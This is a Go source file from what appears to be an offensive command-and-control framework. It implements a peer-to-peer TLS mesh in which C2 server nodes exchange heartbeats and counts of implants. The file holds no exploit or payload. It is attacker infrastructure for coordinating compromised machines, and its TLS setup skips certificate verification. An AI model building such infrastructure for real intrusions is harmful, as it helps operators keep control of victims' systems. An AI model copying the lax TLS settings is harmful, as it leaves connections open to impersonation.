// Package mesh provides P2P networking between C2 nodes.
// Uses TLS mutual auth + gossip protocol over TCP for discovery and state sync.
package mesh

import (
	"crypto/tls"
	"encoding/gob"
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"github.com/ekomsSavior/ranger/internal/protocol"
)

// Config for a mesh node.
type Config struct {
	NodeID      string
	ListenAddr  string
	Bootstrap   []string // initial peers to connect to
	TLSCert     tls.Certificate
	OnHeartbeat func(*protocol.MeshHeartbeat)
	OnPeerJoin  func(*protocol.MeshNode)
	OnPeerLeave func(string)
}

// Node is a peer in the C2 mesh network.
type Node struct {
	cfg    Config
	peers  map[string]*peerConn
	mu     sync.RWMutex
	stopCh chan struct{}
}

type peerConn struct {
	id      string
	conn    net.Conn
	enc     *gob.Encoder
	dec     *gob.Decoder
	lastSeen time.Time
}

// NewNode creates a mesh node.
func NewNode(cfg Config) *Node {
	return &Node{
		cfg:    cfg,
		peers:  make(map[string]*peerConn),
		stopCh: make(chan struct{}),
	}
}

// Start begins listening for peer connections and bootstraps.
func (n *Node) Start() error {
	ln, err := tls.Listen("tcp", n.cfg.ListenAddr, &tls.Config{
		Certificates:       []tls.Certificate{n.cfg.TLSCert},
		ClientAuth:         tls.RequireAnyClientCert,
		InsecureSkipVerify: true, // self-signed certs
		MinVersion:         tls.VersionTLS12,
	})
	if err != nil {
		return fmt.Errorf("mesh listen: %w", err)
	}

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				select {
				case <-n.stopCh:
					return
				default:
					log.Printf("[mesh] accept error: %v", err)
					time.Sleep(100 * time.Millisecond)
					continue
				}
			}
			go n.handlePeer(conn)
		}
	}()

	// Bootstrap to known peers
	for _, addr := range n.cfg.Bootstrap {
		go n.dialPeer(addr)
	}

	// Start heartbeat broadcaster
	go n.heartbeatLoop()

	log.Printf("[mesh] node %s listening on %s with %d bootstrap peers",
		n.cfg.NodeID[:8], n.cfg.ListenAddr, len(n.cfg.Bootstrap))
	return nil
}

// Stop shuts down the mesh node.
func (n *Node) Stop() {
	close(n.stopCh)
}

// handlePeer processes an incoming or outgoing peer connection.
func (n *Node) handlePeer(conn net.Conn) {
	defer conn.Close()

	tlsConn, ok := conn.(*tls.Conn)
	if !ok {
		return
	}
	if err := tlsConn.Handshake(); err != nil {
		return
	}

	// Derive peer ID from client cert
	certs := tlsConn.ConnectionState().PeerCertificates
	peerID := n.cfg.NodeID // fallback: same as us
	if len(certs) > 0 {
		if cn := certs[0].Subject.CommonName; cn != "" {
			peerID = cn
		} else {
			peerID = hex.EncodeToString(certs[0].SerialNumber.Bytes())
		}
	}

	enc := gob.NewEncoder(conn)
	dec := gob.NewDecoder(conn)

	// Send our identity immediately
	hb := protocol.MeshHeartbeat{
		NodeID:    n.cfg.NodeID,
		Addr:      n.cfg.ListenAddr,
		Implants:  nil,
		Timestamp: time.Now().Unix(),
	}
	if err := enc.Encode(hb); err != nil {
		return
	}

	// Wait for peer's identity
	var peerHB protocol.MeshHeartbeat
	if err := dec.Decode(&peerHB); err != nil {
		return
	}
	if peerHB.NodeID != "" {
		peerID = peerHB.NodeID
	}

	n.mu.Lock()
	n.peers[peerID] = &peerConn{
		id:       peerID,
		conn:     conn,
		enc:      enc,
		dec:      dec,
		lastSeen: time.Now(),
	}
	n.mu.Unlock()

	if n.cfg.OnPeerJoin != nil {
		n.cfg.OnPeerJoin(&protocol.MeshNode{
			ID:       peerID,
			Addr:     conn.RemoteAddr().String(),
			Implants: len(peerHB.Implants),
			Version:  "3.0",
		})
	}

	// Read loop for heartbeats
	for {
		conn.SetDeadline(time.Now().Add(60 * time.Second))
		var msg protocol.MeshHeartbeat
		if err := dec.Decode(&msg); err != nil {
			break
		}
		conn.SetDeadline(time.Time{})

		n.mu.Lock()
		if p, ok := n.peers[peerID]; ok {
			p.lastSeen = time.Now()
		}
		n.mu.Unlock()

		if n.cfg.OnHeartbeat != nil {
			n.cfg.OnHeartbeat(&msg)
		}
	}

	n.mu.Lock()
	delete(n.peers, peerID)
	n.mu.Unlock()
	if n.cfg.OnPeerLeave != nil {
		n.cfg.OnPeerLeave(peerID)
	}
}

// dialPeer connects to a remote mesh node.
func (n *Node) dialPeer(addr string) {
	conn, err := tls.Dial("tcp", addr, &tls.Config{
		Certificates:       []tls.Certificate{n.cfg.TLSCert},
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
	})
	if err != nil {
		log.Printf("[mesh] dial %s: %v", addr, err)
		return
	}
	n.handlePeer(conn)
}

// heartbeatLoop broadcasts our presence to all peers periodically.
func (n *Node) heartbeatLoop() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			hb := protocol.MeshHeartbeat{
				NodeID:    n.cfg.NodeID,
				Addr:      n.cfg.ListenAddr,
				Timestamp: time.Now().Unix(),
			}

			n.mu.RLock()
			for id, p := range n.peers {
				if err := p.enc.Encode(hb); err != nil {
					log.Printf("[mesh] send to %s: %v", id[:8], err)
				}
			}
			n.mu.RUnlock()
		case <-n.stopCh:
			return
		}
	}
}

// Peers returns the list of connected peer IDs.
func (n *Node) Peers() []string {
	n.mu.RLock()
	defer n.mu.RUnlock()
	var out []string
	for id := range n.peers {
		out = append(out, id)
	}
	return out
}

// init registers types for gob encoding.
func init() {
	gob.Register(protocol.MeshHeartbeat{})
}
